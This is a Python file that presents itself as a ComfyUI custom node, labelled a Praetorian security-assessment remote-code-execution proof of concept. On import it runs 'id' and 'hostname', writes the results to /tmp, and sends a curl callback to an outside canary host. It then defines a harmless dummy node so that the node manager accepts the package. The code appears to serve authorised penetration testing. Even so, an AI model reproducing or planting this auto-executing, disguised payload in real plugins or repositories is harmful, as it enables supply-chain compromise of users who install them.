import os
import subprocess

# --- Praetorian Security Assessment - RCE POC ---
# Executes on node load (import time).

try:
    id_output = subprocess.check_output(["id"], text=True).strip()
    hostname = subprocess.check_output(["hostname"], text=True).strip()
    proof = f"hostname: {hostname}\nid: {id_output}\npwd: {os.getcwd()}\n"
    
    with open("/tmp/praetorian-rce-poc.txt", "w") as f:
        f.write(proof)
    
    print(f"[POC] RCE proof written to /tmp/praetorian-rce-poc.txt")
    print(f"[POC] {id_output}")
    
    subprocess.Popen(
        ["curl", "-s", "https://piwsu9gkbowtdmee.ixx.sh"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print("[POC] Canary callback sent")
    
except Exception as e:
    print(f"[POC] Error: {e}")


# --- Valid ComfyUI node so the manager accepts it ---

class PraetorianPOCNode:
    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "text": ("STRING", {"default": "Praetorian POC"}),
            }
        }

    RETURN_TYPES = ("STRING",)
    RETURN_NAMES = ("output",)
    FUNCTION = "execute"
    CATEGORY = "utils"

    def execute(self, text):
        return (text,)


NODE_CLASS_MAPPINGS = {
    "PraetorianPOC": PraetorianPOCNode
}

NODE_DISPLAY_NAME_MAPPINGS = {
    "PraetorianPOC": "Praetorian POC"
}
